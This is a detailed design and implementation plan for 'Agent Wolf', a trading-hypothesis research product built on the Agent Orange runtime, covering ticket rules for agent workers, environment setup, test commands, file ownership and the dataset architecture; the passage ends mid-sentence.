# Agent Wolf — Design & Implementation Plan

> **EXECUTION RULES (for agents):** Work ONE ticket at a time, in order unless
> dependencies say otherwise. Only the orchestrator changes ticket Status;
> workers may only append to Notes and the Discovered Issues Log. A ticket's
> checkbox is checked only after its Validation commands have been re-run by
> the orchestrator and pass. Do not expand scope; log surprises in the
> Discovered Issues Log instead.
>
> **You do not need to read anything outside this document plus the files each
> ticket names.** § "Executor orientation" below contains every environment
> fact, command and house rule required. If you find yourself needing wider
> context, that is a defect in this plan — log it.

Status: approved
Revision: 5 (2026-08-24) — incorporates two adversarial reviews, one executability audit, the
report-layer amendment and **the UI design** (`design/2026-08-24-agent-wolf-ui.md`, approved
2026-08-24); see the Discovered Issues Log, entries R1–R150. Two owner rulings on 2026-08-21 added
W8b and W2b; revision 5 adds O12, O13, W27, W28, W29 and W30, so the ticket count is **47**, not 39.
**37 are done.** W13 and W14 landed 2026-08-24; W30, W17 and **W19** landed 2026-08-26, so the report
chain continues **W21 → W22**, and W22 is what unblocks both W23 and W27. W25 and W29 are also
ready now and independent of that chain.

⚠️ **Revision 5 reverses a standing decision and rewrites five criteria.** `web/` **is** installable
— proved by building, packing and consuming it (see **R125**) — so Wolf now imports Orange's types
and presentational components and iframes only the chat. The detail page is two columns, the board
is an attention queue, and trust is rendered on two independent channels. **Read
`design/2026-08-24-agent-wolf-ui.md` before touching W13, W14, W19, W21, W22, W23 or W24.** Waves 1 (O1, O7, W1),
2 (O2, O11, W2, W3, W6), 3 (O3, O4, W4, W7, plus W1b and W6b) and 4 (O5, O6a, W5, W12, O8) have
been executed; their tickets carry Notes.

⚠️ **Everything through wave 3 is now merged to `main` in both repos** (2026-08-21, the wave-4
pre-flight). Wave 4 forced it: O5 needs O3+O4, W5 needs W2+W4+O11 and W12 needs W2+W7, and no
single branch carried any of those combinations. Both trunks are gated green — agent-orange
`go build ./... && go vet ./... && go test ./...` with `AGENTKIT_TEST_POSTGRES_URL` set and
**zero `--- SKIP`** across `./agentdb/...`; agent-wolf `yarn typecheck && yarn test` in `api/`
(307 tests) and `web/` (15). **Branch every wave-4 ticket from `main`, and read every
`git diff … main` Validation command literally again** — see R68.
Relates: `docs/19-embedding.md` (the integration guide written FOR this product),
`design/2026-08-06-embeddable-agent-orange.md`, `docs/18-workers-memory-events.md`,
`docs/06-artifacts.md`, `docs/product/17-product-spec.md`

---

## Context

**Agent Wolf is a platform for stating trading hypotheses and having them deeply researched
and continuously validated.** A user states a thesis — "the petrodollar is ending because of
drone warfare, therefore buy drone-parts suppliers" — and the system interviews them to sharpen
it, locks a falsifiable scoreboard, then researches and scores it every day until a human
confirms or invalidates it.

Three stages:

1. **Interview** — an agent session with deep web research that hones the thesis and produces a
   machine-checkable spec.
2. **Autonomous validation** — a daily job per hypothesis that fetches numbers, writes them to a
   shared dataset, and files evidence.
3. **Verdict** — a deterministic evaluator (not the model) trips an invalidation condition, the
   agent presents its case, and a human confirms or invalidates.

Agent Orange is the runtime. `docs/19-embedding.md` was written for exactly this integration and
names Agent Wolf as its driving use case; its § 8 "two-bot pattern" is the shape this plan
follows. Wolf owns the page, the vocabulary and the user allowlist; Orange owns prompts,
sessions, schedules, memories and (after this plan) datasets.

### The two problems Orange cannot solve today

**1. There is nowhere to put a shared numeric time series.** Orange has memories (append-only
text, whose content crosses the model's context window on every read and write) and session
snapshots (files, but scoped to the one session that wrote them — `docs/06-artifacts.md:37`
dedups artifacts on `session_id + file_path`, and the daily researcher runs in a **fresh**
container every tick). A 200KB series in a memory would cost tokens daily and could be silently
mangled by the model retyping it.

**2. An application embedding Orange cannot write a memory.** Verified:
`go/httpapi/httpapi.go:84` — *"Read-only by design — memories are appended by workers, never by
the UI"*; `go/httpapi/memories.go:43` — *"there is no POST counterpart — and no PUT or DELETE
anywhere"*. The only write surface is `memory_create` on the core MCP server, authenticated by a
**session token** an embedder does not hold. Wolf's entire system of record depends on closing
this gap.

So this plan adds **two** engine features — the **dataset atom** and an **authenticated memory
append route** — and builds Wolf on top of them.

### Decisions taken during design, with their reasons

- **Tiered UI reuse — REVISED 2026-08-24, revision 5 (was "iframe-only").** `web/` *is*
  installable; the blockers were `"private": true`, one `"noEmit": true` line, and five runtime
  deps misfiled under `devDependencies`. Proved by building, packing and rendering it inside a
  foreign app (**R125**). Wolf therefore **imports** Orange's types and pure logic (tier 1) and its
  presentational components (tier 2) from `@agentkit/chat-ui`, rendered under **Wolf's own**
  `ThemeProvider` — 45 of 53 components take props and nothing else. Only `AgentChat` and the
  stateful pages (tier 3) stay behind `GET /embed/session/{name}#token=…`, because that is the one
  tier where an Orange change would force every client app to move. Rationale and the tier table:
  `design/2026-08-24-agent-wolf-ui.md` § 1.
- **Dataset atom in Orange, not a file store in Wolf.** It matches Orange's existing atom grain
  (name + labels + version + provenance + selector search, exactly like images, skills and
  memories) and is reusable by every future embedder.
- **Worker per hypothesis.** A worker's prompt is what `worker_prompt_write` can rewrite with a
  mandatory rationale; per-hypothesis workers let each hypothesis's research method improve
  independently.
- **Locked scoreboard + open research log.** The interview cannot conclude without a spec naming
  metrics, directions, horizons and invalidation conditions. Those are locked at go-live;
  amendments require a rationale and a human. The researcher may propose, never enact.
- **Conditions are typed predicates evaluated by Wolf, never prose judged by the model.** See
  § "The trust model" — this is the single most important correction in revision 2.
- **Refetchable metrics are REPLACED, not appended.** Dividends re-adjust price history and FRED
  restates macro series months later. An append-only price file diverges from the source within
  weeks and nothing detects it.
- **Agent proposes, human decides**, enforced by **provenance**, not by prompts.
- **One `wolf` project, slug owner labels.** Orange label values are the K8s charset
  (`go/agentdb/labels.go:32`) — no `@`.

---

## Executor orientation

**Read this once before your first ticket. It is everything you need to know about the
environment.**

### The two repositories

| | Path | What it is |
| --- | --- | --- |
| **agent-orange** | `/home/kai/projects/badcode/agent-orange` | The existing engine. Go module `github.com/binocarlos/badcode-agent-orange`, plus a TypeScript in-image agent (`sandbox/`) and a React component library (`web/`). |
| **agent-wolf** | sibling directory `agent-wolf`, created by W1 | The new product. Node/TS API + React UI. Imports **nothing** from agent-orange. |

Ticket ids beginning `O` change agent-orange; ids beginning `W` change agent-wolf; `X1` spans
both.

### House rules that will fail your ticket if broken (agent-orange)

1. **The `go/` module imports nothing from any host app.** CI enforces it.
2. **Module path is `github.com/binocarlos/badcode-agent-orange`.** Never `bayes-price/agentkit`.
3. **`migration-reference/` is reference, not code.** Do not build, import or wire it.
4. **Installation Dockerfiles never set `CMD`, `ENTRYPOINT`, `EXPOSE`, `HEALTHCHECK` or
   `WORKDIR`.** The sandbox base owns all five. `WORKDIR` joined the list on 2026-08-13 after
   setting it broke every session launched from `core` and `example`.
5. **`go build ./...` stays green and changes come with tests**, following the existing
   table-test patterns.

### The Validation rule — the one that cost us the most

> **A ticket's Validation commands must be capable of exercising every acceptance criterion it
> states.** If a criterion describes runtime behaviour, a command that only compiles or typechecks
> does not gate it.

Wave 1 proved this twice and the executability audit found it in eight more tickets. O1's only
Validation was `go build && go vet`, while its first criterion was "the migration applies cleanly
on a fresh database and is idempotent on re-run" — a claim neither command can execute. W1's only
topology Validation was `docker compose config`, which is how an nginx bug that broke every route
survived the first verification pass.

Three specific traps, each of which has already bitten:

1. **Go live-Postgres cases SKIP silently** without `AGENTKIT_TEST_POSTGRES_URL`. A green run
   without it proves nothing. Every such ticket's Validation ends with a `-v` run and the
   instruction to confirm **zero `--- SKIP` lines**.
2. **`go test -run` patterns are unanchored substrings.** `-run 'TestGC'` does not match
   `TestResolveGCConfig`; `-run 'TestMemor'` does not match `TestListMemories_*`. Where a ticket
   filters by name, its Scope pins the test-name prefix so the filter and the code agree.
3. **`yarn test <path>` matches nothing outside the vitest `include` glob.** `api/vitest.config.ts`
   includes `src/**` only, so `yarn test scripts/bootstrap-project` runs zero files and exits 0.

### Commands

```sh
# agent-orange — the gates. All three must pass.
cd go && go build ./... && go vet ./... && go test ./...

# agentdb's live-Postgres cases SKIP unless this is set — see the next section.

# agent-orange — the stack (Docker required)
cp .env.example .env && docker compose up --build       # http://localhost:8080
docker compose up -d --build web                        # after ANY UI edit; the stack serves a BUILT image
./e2e/run-stack-e2e.sh clean                            # clear leftover sessions, restart agentd

# agent-wolf
cd api && yarn typecheck && yarn test
cd web && yarn typecheck && yarn test
```

### The throwaway Postgres — copy these four commands

`agentdb`'s live cases skip silently without `AGENTKIT_TEST_POSTGRES_URL`, so a green
`go test ./...` does **not** prove the jsonb-selector, CAS or pgvector paths. O2, O3, O7 and O11
all depend on those cases actually running.

CLAUDE.md requires a **throwaway** database, not a shared one — an unmerged migration on a sibling
branch has broken other agents' runs before. The commands below give each run a disposable
instance whose storage is a tmpfs, so removing the container erases everything. They were run and
verified on 2026-08-20: with this instance running and the variable exported, the **entire
`go test ./agentdb/... -count=1` suite passes with ZERO skipped tests** — which is the whole point,
since without the variable the live cases skip silently and a green run proves much less than it
appears to.

**1. Start it** (port 5433, not 5432, so it cannot collide with a local Postgres or the compose
stack; the image is the same `pgvector/pgvector:pg16` the stack uses, so the semantic-search leg is
available rather than silently absent):

```sh
docker run -d --name agentkit-testpg \
  -e POSTGRES_USER=throwaway -e POSTGRES_PASSWORD=throwaway -e POSTGRES_DB=agentkit_test \
  -p 5433:5432 --tmpfs /var/lib/postgresql/data:rw,size=1g \
  pgvector/pgvector:pg16
```

**2. Wait for it, and enable pgvector** (the migrations attempt `CREATE EXTENSION vector`
themselves and swallow failure, so doing it here as superuser is what guarantees the vector column
exists rather than being quietly skipped):

```sh
until docker exec agentkit-testpg pg_isready -U throwaway -d agentkit_test >/dev/null 2>&1; do sleep 1; done
docker exec agentkit-testpg psql -U throwaway -d agentkit_test -c 'CREATE EXTENSION IF NOT EXISTS vector;'
```

**3. Run the live tests:**

```sh
export AGENTKIT_TEST_POSTGRES_URL='postgres://throwaway:throwaway@localhost:5433/agentkit_test?sslmode=disable'
cd go && go test ./agentdb/... -count=1
```

Confirm the live cases really ran rather than skipped — the names contain `Live`:

```sh
go test ./agentdb/... -run 'Live' -count=1 -v | grep -E '^--- (PASS|SKIP|FAIL)'
```

A `SKIP` here means the variable did not reach the test, and any ticket claiming a green live run
is unproven.

**4. Reset between runs, or tear down.** A half-applied migration from a failed ticket will poison
every later run, and the fix is to throw the instance away — that is the whole point of it being
throwaway:

```sh
docker rm -f agentkit-testpg      # then repeat step 1
```

### Environment facts you must not rediscover the hard way

- **The product layer is wired only when `DATABASE_URL` is set.** On the sqlite fallback the
  router never routes, schedules never fire, `/mcp` is not mounted, and **nothing fails at use
  time** — it silently does nothing. Compose always sets it. Everything in this plan is
  Postgres-only.
- **Nothing in this plan works in dev-open mode.** Configuring a project API key is exactly what
  turns dev-open off (`go/cmd/agentd/auth.go:63`).
- **A real `.env` for this project exits at boot on the GCS key and would run a billable agent.**
  Use the mock-mode invocation in `README-stack.md` § "If you have a real `.env`: two traps", and
  assert the boot-log line that proves mock mode.
- **Sessions hold a container and a host port until deleted or idle for 30 minutes.** The port
  pool is 100 by default. At zero free, every create fails with "host port pool is exhausted".
  Delete sessions you finish with.
- **Lockfiles are inconsistent.** `sandbox/` tracks both `package-lock.json` and a stale
  `yarn.lock` — run `git checkout sandbox/yarn.lock` after any npm install there. `web/` tracks
  only `package-lock.json` (`npm ci`). `examples/web/` tracks only `yarn.lock` (use yarn).
- **Timestamp units differ across the product surface and this is deliberate.** `memories`,
  `config_events` and (new) `datasets` are unix **milliseconds**; the `agent_*` tables are unix
  **seconds**. Do not unify them. Encode the unit in every type you write.
- **Label values are the Kubernetes charset**, `^[A-Za-z0-9]([-A-Za-z0-9_.]*[A-Za-z0-9])?$`,
  ≤63 chars, ≤32 labels per object (`go/agentdb/labels.go:22-33`). No `@`, no `+`, no `/`,
  no spaces. This constrains dataset names, memory labels and metric slugs alike.
- **`api/`'s tsconfig sets `noUncheckedIndexedAccess`.** Every array index is `T | undefined` at
  typecheck time. It is the right setting and it materially shapes any numeric module — running
  peaks, window edges, zip-by-index — so budget for it. Two of W4's three fix rounds were this
  alone (**R76**). `api/` also uses `moduleResolution: NodeNext`, so a JSON import needs an import
  attribute; read a fixture with `readFileSync(new URL(...), "utf8")` instead.
- **Compose forwards an unset optional variable as the empty string, not as absent.** A
  `${VAR:-}` entry arrives as `""`, and `z.coerce.number()` turns `""` into `0` — so
  `env.FOO ?? default` silently yields 0 rather than the default. Use W7's `present()` helper
  (`api/src/config.ts`) for every optional numeric variable (**R80**).
- **`docker compose config` prints interpolated secrets to stdout.** Once `WOLF_API_KEY`,
  `WOLF_MCP_TOKEN` or `FRED_API_KEY` are set in the environment, that command echoes their values.
  No ticket's Validation may use it verbatim: grep for variable **names**, or pipe through a
  redactor (**R82**). Note that `... config | grep WOLF_API_KEY` is **not** a fix — grep prints the
  whole matching line, value included. Use this, and only this:

  ```sh
  # The redacted form. Every Validation that inspects compose uses it.
  dcc() {
    docker compose config | sed -E 's/(WOLF_API_KEY|WOLF_MCP_TOKEN|FRED_API_KEY|ANTHROPIC_API_KEY|GOOGLE_CLIENT_SECRET|WOLF_SESSION_SECRET)([^A-Za-z0-9_].*)$/\1: <redacted>/'
  }
  ```

  The substitution fires on the variable **name** wherever it appears, so it redacts both the
  `KEY: value` mapping form and the `KEY=value` list form. Applied for O8, W13 and X1
  (2026-08-21).
- **Selectors are Kubernetes selector semantics exactly**: `k=v`, `k!=v`, `k in (a,b)`,
  `exists k`, `!k`, comma means AND. **No OR and no nesting** — run two searches.

### Pinned technology choices — do not substitute

These are named here, once, so that fourteen tickets do not each pick differently.

| Concern | Choice | Notes |
| --- | --- | --- |
| Wolf API HTTP framework | **Express 5** | Plain middleware; no DI framework, no decorators |
| MCP server implementation | **`@modelcontextprotocol/sdk`**, HTTP transport | Do not hand-roll JSON-RPC |
| Test runner | **vitest 4** in both `api/` and `web/` | Matches Orange's JS packages |
| Vite (in `web/` only) | **6.x** | vitest 4's peer range is vite 6+, so `web/` **deliberately diverges** from `examples/web`'s vite 5. Owner decision 2026-08-21, **R40**. React/MUI still match `examples/web` — those are the versions the visual language depends on; vite is a build tool. Do NOT pin vite 5 here to "match", or `vite.config.ts` gets evaluated by two different resolvers |
| HTTP mocking in tests | **`undici` `MockAgent`** | No `msw`, no `nock`, no live network in any unit test |
| React | **18.3.1**, MUI **6** | Same versions as `examples/web` so the visual language matches |
| Charts | **Recharts** | One library; no d3 by hand |
| Dates | **native `Date` + explicit UTC helpers** | No moment, no dayjs — the units are the bug surface, keep them visible |
| Validation | **zod** | Spec and condition schemas, and every route body |
| Logging | **`pino`**, JSON to stdout | One line per request; never log a credential or a `download_url` |
| HTML sanitisation | **`isomorphic-dompurify` 2.x** | One sanitiser in the tree, server-side only. Pulls `jsdom` into `api/`. No `sanitize-html`, no `xss`, no hand-rolled tag regex |
| Router (`web/`) | **React Router 7** | The leaner of the two options; needed before a second page can be registered |
| Sessions (`api/`) | **A signed `HttpOnly` cookie** via `cookie-parser`'s built-in signing | Wolf holds no server-side session state, so a session-store library would be machinery for nothing. `SameSite=Lax`; `Secure` outside development |
| Component tests (`web/`) | **`@testing-library/react` 16.x** + `@testing-library/jest-dom` | `web/` ships only `vitest` + `jsdom`; the sandbox-attribute assertion cannot be written without this |
| Market data (macro) | **FRED keyed JSON API**, `FRED_API_KEY` | The keyed API is the only path with a search endpoint, which `series_search` requires. The key is free and instant from the St. Louis Fed |

### Shared error taxonomy

Defined once in `api/src/errors.ts` (created by W1, used by every later ticket). Do not invent a
second one:

```ts
export type WolfErrorKind =
  | "not_found"        // the thing does not exist
  | "unavailable"      // an upstream is down or timed out — RETRYABLE
  | "invalid"          // caller error; carries field-level details
  | "conflict"         // CAS or state-machine rejection
  | "forbidden"        // authenticated but not allowed
  | "misconfigured"     // an env var or an Orange-side setting is wrong; names the variable
  | "internal";        // WE have a bug — an unhandled throw. NOT retryable

export class WolfError extends Error {
  kind: WolfErrorKind; status: number; details?: unknown; upstreamBody?: string;
}
```

`not_found` and `unavailable` **must** be distinguishable: W10's poller treats a 404 dataset as
"not written yet" and an outage as a reason to skip without penalty, and conflating them makes a
provider outage look like a missing metric.

**Every catch-all handler maps an unrecognised throw to `internal`, never to `unavailable`.**
`unavailable` is the one retryable kind, so classifying a server bug as `unavailable` makes W10's
poller retry a crashing endpoint on every tick forever (owner decision 2026-08-21, **R39**).
`internal` maps to HTTP **500**, and its `message` is **not** passed through to the client — a
stack trace or a credential in a thrown error must not reach a response body. Log the real error
server-side with `pino`; return a fixed string and, where one exists, a correlation id.

**Orange refusing a session because its host port pool is exhausted maps to `unavailable`**, and
here the retryable semantics are correct rather than a bug: deleting a finished session frees a
port, so the condition genuinely clears. Surface Orange's message verbatim — "host port pool is
exhausted" is operational and actionable, and flattening it into "could not create" throws away the
only useful part.

### Parallelism and file ownership

Tickets that touch the same file **must not run concurrently**, whatever the dependency graph
allows:

| Shared file | Tickets | Rule |
| --- | --- | --- |
| `go/agentdb/datasets.go`, `datasets_test.go` | O1, O2, O3 | Strictly serial in that order |
| `go/agentdb/datasets_live_test.go` | O2, O3 | Strictly serial |
| `go/httpapi/httpapi.go` | O5, O7, O11 | Strictly serial; each adds a route constant and a registration line to the same two blocks |
| `go/httpapi/memories.go` | O7, O11 | Strictly serial |
| `go/cmd/agentd/main.go` | **O5**, O6b, O8 | Strictly serial. O5 was missing from this row for three revisions while its own Files line required modifying `main.go` to wire `DatasetBlobs`; the orchestrator caught it at the wave-4 cut and serialised O5 → O8 by hand. O5 and O8 are both landed, so O6b is the only one left — **R86** |
| `api/src/routes/hypotheses.ts` | W8, W9, W22, **W27** | Strictly serial |
| `api/src/hypothesis/provision.ts`, `provision.test.ts` | W9, **W10** |
| `api/src/hypothesis/poller.ts`, `poller.test.ts` | W10, **W27** | Strictly serial. W27 adds the ` stale=<n>` token to the summary line W10 writes — added in revision 5, and the same **R94** class of omission it exists to prevent |
| `web/src/theme.ts`, `web/src/main.tsx`, `web/src/components/trust/*` | **W28** only | W28 authors all of them; W13, W14, W23 and W24 **import** and must not edit. A ticket that adds a second theme or its own severity treatment has broken revision 5's whole point | Strictly serial. W9 creates them; **W10 changes teardown step 4 to use the shared in-flight exclusion (R112)** — added 2026-08-22 |
| `api/src/routes/auth.ts`, `auth.test.ts` | W8, **W8b** | Strictly serial. W8 creates them; W8b adds `/api/auth/me` and `/api/auth/logout` |
| `api/src/auth/session.ts`, `session.test.ts` | W8, **W9** | Strictly serial. W8 creates them; **W9 adds the mint-site trim (R103)** — added 2026-08-21 by the wave-6 pre-flight, which is the sixth time the ownership table has been found short (R81, R86, R94, R98, R110 and this) |
| `api/src/hypothesis/store.ts`, `store.test.ts` | W5, **W8**, **W15**, W10, W22, **W27** | **Strictly serial in that order — corrected 2026-08-21, R98.** W8 was missing from this row entirely while its own Files line modifies both files, and the printed order put W10 before W15 although W15's Depends-on is `W5, O11` and W10 sits four tickets deep behind W8 → W9. Honouring the old order would have serialised the whole report layer behind the UI chain for no dependency reason. W8 and W15 are the two chain heads and must not run concurrently; W8 goes first because its chain (W9 → W10 → W11 → W13 → W14) is the longer one |
| `go/cmd/agentd/auth.go`, `auth_test.go` | O5 only | O5 owns the middleware change; no other ticket may touch it |
| `go/agentdb/memories.go` | O7, O11 | Strictly serial |
| `api/src/orange/client.ts`, `client.test.ts` | W2, W15, **W2b**, **W29** | Strictly serial in that order. W2's route list was declared exhaustive and closed; **W2b adds the twenty-third, `GET /agent/workers/{name}`, by owner decision 2026-08-21 (R91)** — the list is closed against casual addition, not against an owner ruling |
| `api/src/config.ts`, `.env.example` | W1, W6, W7, W8, W9, W10, W11, W12, W16, ~~W21~~, X1 | **Strictly serial in dependency order.** Each ticket adds only the variables its own criteria name, and documents each in `.env.example` with a comment |
| `api/src/app.ts` | W1, W7, W8, W11, W21, **W29** | 🔴 **W21 and W29 must NOT run concurrently** — both modify this file, and wave 13 ran W21 alongside W25 for exactly that reason. | Strictly serial; every router is mounted here, by the ticket that creates it |
| `docker-compose.yml` (agent-wolf) | W1, W7, W8, W9, W10, W11, W16, ~~W21~~, X1 | **Strictly serial, same order as `config.ts`.** A variable in `.env.example` and `config.ts` still never reaches the container without an `environment:` entry here — R81 |

⚠️ **An earlier revision restricted `config.ts` and `.env.example` to three tickets and forbade
everything else from touching them. That was wrong and it blocked eight tickets** — W6 needs
`FRED_API_KEY`, W8 needs the allowlist and session secret, W9/W10/W11 need their durations, and
none of the three owners lands before them. A ticket adds the variables its own criteria require;
the serial rule prevents the collision, not an ownership monopoly. Every duration variable ends in
`_SECONDS` and holds a plain integer count of seconds — `WOLF_POLL_INTERVAL_SECONDS`, not
`WOLF_POLL_INTERVAL`, because "5m" in a variable whose unit is unstated is exactly the ambiguity
§ Vocabulary exists to prevent.
| `api/src/routes/hypotheses.ts` | W8, W9, W22, **W27** | Strictly serial |
| `api/src/report/*` | W15, W16, **W30**, W17, W18, W19, W20, W25 | **One exception, ruled 2026-08-26: W19 also makes narrow additive edits to `template.ts` AND `template.test.ts`** (the Ruling 2 refusal and `TemplateSlot.tagName`). The row prevents *concurrent collision*, not ownership; W16 and W30 were merged and nothing was in flight. Otherwise: **each ticket creates its OWN file** — `kinds.ts` (W15), `template.ts` (W16), `sanitise.ts` (W17), `series.ts` (W18), `frame.ts` (W19), `drift.ts` (W20), `__fixtures__/` + `fixture.test.ts` (W25). Ordering is the dependency graph and nothing more, so W17, W18 and W20 may run concurrently once W16 lands. *(This row previously read "See the report-layer sub-graph", naming a section that does not exist — R121. A wildcard row also implied a serialisation these tickets do not need.)* |
| `web/package.json`, `web/vite.config.ts`, **`web/src/setupTests.ts`** | **W28**, W13, W23, W24 | Strictly serial |
| `web/src/App.tsx` | W13, W24 | Strictly serial |
| `web/src/api/types.ts`, `web/src/api/client.ts` | **W13**, W14, W23, W24 | **Strictly serial. W13 creates them and they are NOT on its printed Files line** — the R94 class again, eleventh instance. `types.ts` holds the wire shapes (`BoardRow` incl. `attention_tier`/`attention_count`/`stale_count`/`headline`, `HypothesisDetail` incl. `spec_validation`); `client.ts` is the only module that calls `fetch`. **W14 WIDENS `HypothesisDetail` here; it must not declare a second detail type or add a second fetch** |
| `web/src/components/ChatRail.tsx`, `OrangeChatFrame.tsx` | **W13** only | W13 authors both; W14 **imports `ChatRail` and must not re-implement the sticky column** — the rail owns `position: sticky`, `height: 100vh`, `clamp(340px, 28vw, 460px)`, the collapse state and the below-`md` tab branch. A ticket that rebuilds any of that has broken the D4 sizing argument |
| `web/src/components/HypothesisRow.tsx`, `StatusChip.tsx`, `TamperWarning.tsx`, `GoLiveButton.tsx` | **W13**, W14, W24 | Strictly serial. `HypothesisRow` is shared by the board **and** the archive, so a change there changes both. **`GoLiveButton` is the single go-live gate: W24 adds a SECOND PROP for the accepted-template half, never a second gate** |
| `web/src/board/tiers.ts` | **W13**, W27 | W13 owns the client-side grouping and sorting; **W27 owns the server-side tier computation and must not duplicate the grouping** (R138) |
| `web/src/testUtils.tsx` | **W13**, W14, W23, W24 | Strictly serial. Holds `stubFetchRoutes`, which **throws on any unrouted path** — that is what keeps the no-live-network pin honest under `vi.stubGlobal`. Every later UI test that renders the detail page must stub the embed-token route, and anything rendering the rail needs fake timers |
| `web/src/format.ts`, `web/src/reasons.ts` | **W14**, W23, W24 | **Strictly serial. W14 creates both and neither is on its printed Files line** (R94 class, twelfth instance). `format.ts` is the one UTC date/number formatter; `reasons.ts` is the one gloss table for W4's six-value `Reason` union (`REASON_GLOSS`, `reasonPhrase`, `indeterminateCause`, `staleMetricCause`). 🔴 **W23 must import both** — a second gloss table drifts the moment W4 gains a seventh value, and a second date helper puts the UTC rule in two places |
| `web/src/components/{VerdictActions,ChallengedCase,AmendmentList,ReportFrameHost,Scoreboard,ConditionTable,MetricChart,MetricCharts,Timeline}.tsx` | **W14**, W23 | Strictly serial. 🔴 **`VerdictActions` is NOT W23's `VerdictBand`** — the band composes *above* it and must not absorb the buttons; the "buttons only in `challenged`" test targets `VerdictActions`. 🔴 **`ReportFrameHost` owns the panel's height contract and the `postMessage` prohibition; W23's `ReportPanel` is its CHILD** and owns `sandbox="allow-scripts"`. The host mounts its child in exactly one place at a time (fixed in W14's fix round), so W23 gets one live frame, not two |
| `web/src/pages/*.tsx` | **W13**, W14, W24 | W13 creates `HypothesisList`, `NewHypothesis`, `Archive`, `SignIn` and a **working** `HypothesisDetail` placeholder (back-link, title, chip, tamper alerts, go-live gate, rail, two-column layout). **W14 replaces the LEFT COLUMN's contents only**; W24 adds `/hypotheses/:id/golive` to the same `<Routes>` in `App.tsx` |
| `web/Dockerfile` | W1, **W13** | Strictly serial. W13 added the two `VITE_*` build args **and** the missing `COPY web/vendor` that had broken every image build since W28 (**R137**) |
| `prompts/*.md` (agent-wolf) | W12, W25 | **Strictly serial in that order.** W12 authors the four prompts and W25 rewrites the report-authoring half; the row was missing entirely until 2026-08-21 — **R94** |
| `api/src/config.test.ts` | every ticket on the `config.ts` row | **Same serial order as `config.ts`.** A ticket that adds a variable adds its tests here, so the two files move together; the row was missing and W12 landed 68 lines in it without one — **R94** |

Safe to run fully in parallel: **O1 ‖ O7 ‖ W1**, then **O4 ‖ W3 ‖ W6** once their deps land.

⚠️ **Parallel branches inherit each other.** `O7-memory-append-route` was cut while O1 was in
flight and therefore contains O1's commit as well as its own. Branch each ticket from `main`, and
when merging, merge in dependency order.

### Git conventions

One branch per ticket, named `<ticket-id>-<kebab-summary>` (e.g. `o6-dataset-mcp-tools`), branched
from `main`. One commit per ticket unless the work genuinely splits; the message's first line is
`<ticket-id>: <what changed>`. Do not push or open a PR unless the orchestrator asks. Never commit
to `main` directly.

### Vocabulary

| Term | Meaning here |
| --- | --- |
| **Project** | Orange's tenancy boundary. Wolf uses exactly one, id `wolf`. The `customer` claim in a token *is* the project. |
| **Session** | A container running the agent harness, with a conversation. Named, per hypothesis. |
| **Worker** | A row of prompt + tools + wiring. Woken by an event or a schedule; each firing gets a fresh container. |
| **Memory** | An append-only, labelled, project-scoped text row. No update, no delete — "changing" one means appending a newer one. |
| **Dataset** | **New in this plan.** An append-only, labelled, project-scoped, *versioned blob*. |
| **Delivery** | One dispatched job: the record that a worker was woken. |
| **Tick** | One firing of a hypothesis's daily schedule. |
| **Hypothesis id** | The **bare** 8-hex id, e.g. `1a2b3c4d`. It is *not* prefixed. |
| **Session name** | `hyp-<id>`, e.g. `hyp-1a2b3c4d`. The prefix is added exactly once, here. |

⚠️ **Explicit `null` means ABSENT, everywhere in a spec.** Every optional field of a `Spec`,
`Metric`, `Method` or `Condition` may be written as `null` or omitted, and the two are identical:
the validator accepts both and the parsed `Spec` it returns carries **neither** — the key is simply
gone. This matters because § "The condition object" prints its optional fields as explicit nulls
while V22, V23 and V24 are worded "present iff", so on the literal reading the plan's own worked
example fails three of the rules it exists to demonstrate. Whatever writes a spec (W9, W12, an
interviewer model copying the printed shape) will emit nulls; whatever reads one (W4, W10, W14)
must never distinguish `null` from missing. W3 implements this and is the reference
(`api/src/hypothesis/spec.ts`, the `present()` helper). R62.

⚠️ **Do not double the prefix.** An earlier draft had W5 generating ids *as* `hyp-<8 hex>` while W8
created sessions named `hyp-<id>` — producing `hyp-hyp-1a2b3c4d`, under which the trust rule's
"`name` matches an existing `hyp-<id>` session" clause never matches and every hypothesis reads as
untrusted. Ids are bare; the prefix belongs to the session name and to nothing else.

---

## Architecture

```
  ┌─────────────────── agent-wolf (new repo, TypeScript) ────────────────┐
  │                                                                      │
  │  wolf-web (React + MUI, own components, imports no Orange code)      │
  │    │  /api/*              <iframe src=orange/embed/session/…#token>  │
  │    ▼                                     │                           │
  │  wolf-api (Node/TS)                      │                           │
  │    · holds WOLF_API_KEY (never leaves the server)                    │
  │    · mints embed tokens          · hypothesis lifecycle              │
  │    · proxies dataset bytes       · CONDITION EVALUATOR (deterministic)│
  │    · evaluation poller           · provider connectors + cache       │
  │    · /mcp — market-data tools ◄──┼───────────────┐                   │
  │  installations/wolf/Dockerfile   │               │ agent calls tools,│
  │    core + python3 + pandas + duckdb              │ curls signed URLs │
  └───────────┬──────────────────────┼───────────────┼───────────────────┘
              │ X-API-Key            │               │
              ▼                      ▼               │
  ┌──────────────── agent-orange (existing) ─────────┼───────────────────┐
  │  agentd — HTTP API — memories (+ NEW append route) — DATASETS (new) ─┘
  │           router / scheduler — workers — sessions — BlobStore        │
  │  DinD: one container per session, launched from the Wolf image       │
  └──────────────────────────────────────────────────────────────────────┘
```

### The dataset atom

A **dataset** is a project-scoped, named, versioned, labelled blob. Every write creates a new
immutable version; "current" is the highest version for `(project, name)`. This preserves
Orange's append-only posture while giving mutable-file ergonomics.

**Bytes never cross the model's context window, in either direction:**

| Direction | Mechanism | Why this one |
| --- | --- | --- |
| **Write** | `dataset_put(name, path, if_version)` names a file under `/workspace`; agentd pulls it with `Exec` + `cat` | This is exactly what `onArtifactRegistered` already does (`go/runner.go:2733-2736`, "pull the registered file from the running instance workspace via Exec+cat"). `Exec` is the only file seam on the environment interface (`go/execenv/execenv.go:54`). |
| **Read** | `dataset_get(name)` returns a short-lived scoped download URL; the agent `curl`s it to a file | Containers already reach agentd over `AGENTKIT_SELF_URL`. No push-into-container plumbing has to be invented. |

**Compare-and-swap is mandatory on write.** `if_version` must match the current version, or `0`
to mean "must not exist". Without it, two sessions that both read v5 and both write would
silently lose a day of data.

> ⚠️ **The bytes stay out of context; the CREDENTIAL does not.** `dataset_get`'s `download_url`
> carries a bearer token, is returned as a tool result, and therefore enters the model context,
> the persisted transcript, the SSE stream, and every subscriber of `worker.finished` (whose text
> is the full rendered transcript). It is bounded by a 300s TTL and a single-dataset scope. Nor
> does anything stop a model from `df.head()`-ing a CSV into its own context. The guarantee is
> "the plan never *requires* bytes in context", not "bytes can never appear there". Both caveats
